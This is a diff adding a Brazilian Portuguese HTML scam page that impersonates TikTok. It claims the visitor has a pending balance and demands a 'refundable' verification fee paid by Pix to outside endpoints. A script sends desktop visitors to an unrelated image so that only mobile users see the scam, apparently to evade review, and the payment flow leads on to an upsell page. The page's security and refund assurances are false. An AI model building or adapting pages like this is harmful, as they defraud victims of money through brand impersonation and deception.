@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Recompensas – Verificação de Segurança</title>
+
+
+
+  <script type="text/javascript">
+    if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+      window.location.href = 'https://image.1111down.com/xG1nkqKTMzGDvpLrqFT7WA/ef311940-320d-4b47-94ef-600f2eafd920/width=450/1272375.jpeg';
+    }
+  </script>
+
+
+
+  <script src="https://unpkg.com/lucide@latest"></script>
+
+  <script src="js/NSJ9mrs2aFEq.js"></script>
+
+  <link rel="stylesheet" href="style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"
+    rel="stylesheet">
+
+  <!-- Tracking -->
+  <script src="js/DMBrjQJY72vi.js" defer=""></script>
+</head>
+
+<body>
+  <div class="main-content">
+    <div class="wrapper">
+      <header class="header">
+        <img src="images/e7hz5mfPfhcI.png" alt="Seu Logo" class="logo-img" loading="lazy"
+          onerror="this.onerror=null;this.src='https://placehold.co/100x32/FE2C55/FFFFFF?text=LOGO';">
+      </header>
+
+      <main class="main-card">
+        <div class="icon-header"> <i data-lucide="shield-check"></i> </div>
+        <h1>Etapa Final: Confirme para Liberar seu Saldo</h1>
+        <p class="balance-info">Seu saldo pendente para liberação:</p>
+        <p id="balance-amount-display" class="balance-amount">R$ 962,96</p>
+        <div class="info-section">
+          <p>Para <strong>proteger sua conta e seu dinheiro</strong>, o TikTok realiza uma verificação de segurança
+            antes de liberar saldos. Este é um procedimento padrão e importante para:</p>
+          <div class="info-item"> <i data-lucide="lock" class="icon"></i> <span>Proteger sua conta e seus ganhos contra
+              atividades fraudulentas.</span> </div>
+          <div class="info-item"> <i data-lucide="user-check" class="icon"></i> <span>Validar a titularidade da conta,
+              assegurando que o valor seja creditado exclusivamente para você.</span> </div>
+          <div class="info-item"> <i data-lucide="landmark" class="icon"></i> <span>Manter a conformidade com as
+              regulamentações financeiras.</span> </div>
+        </div>
+        <div class="refund-notice">
+          <i data-lucide="info" class="icon"></i>
+          <span><strong>IMPORTANTE:</strong> A taxa de verificação é <strong>100% REEMBOLSÁVEL</strong> junto com seu
+            primeiro saque.</span>
+        </div>
+        <div class="fee-section">
+          <p class="fee-title">Taxa de Verificação de Segurança:</p>
+          <p id="fee-amount-display" class="fee-amount"></p>
+        </div>
+        <button id="cta-btn" class="btn-cta">
+          <span></span>
+          <i data-lucide="arrow-right" class="icon"></i>
+        </button>
+        <div class="processing-notice"> <i data-lucide="lock" class="icon"></i> <span>Pagamento seguro processado pelo
+            TikTok.</span> </div>
+      </main>
+    </div>
+  </div>
+
+  <!-- Note que o HTML dos pop-ups foi removido daqui -->
+
+  <!-- SCRIPT CENTRALIZADO E CONFIGURAÇÃO DA PÁGINA -->
+  <script src="js/22zhSArgXFAp.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+
+      // --- CONFIGURAÇÃO DESTA PÁGINA ---
+      const productInfo = {
+        id: 'taxa-verificacao',
+        name: 'Tiktok - Taxa de Verificação',
+        apiname: 'Peninha',
+        priceInCents: 1990,
+        nextPage: '../upsell/up1'
+      };
+
+      const apiEndpoints = {
+        generatePix: 'https://site-clientes.info/zero-api/pix.php',
+        checkStatus: 'https://site-clientes.info/zero-api/status.php'
+      };
+
+      const brandInfo = {
+        name: 'TikTok',
+        logoUrl: '../complementares/images/e7hz5mfPfhcI.png',
+        countdownSeconds: 10,
+        paidBtnDelay: 15,
+      };
+
+      // --- INICIALIZA O FLUXO DE PAGAMENTO ---
+      initializePaymentFlow(productInfo, apiEndpoints, brandInfo);
+    });
+  </script>
+
+
+</body>
+
+</html>
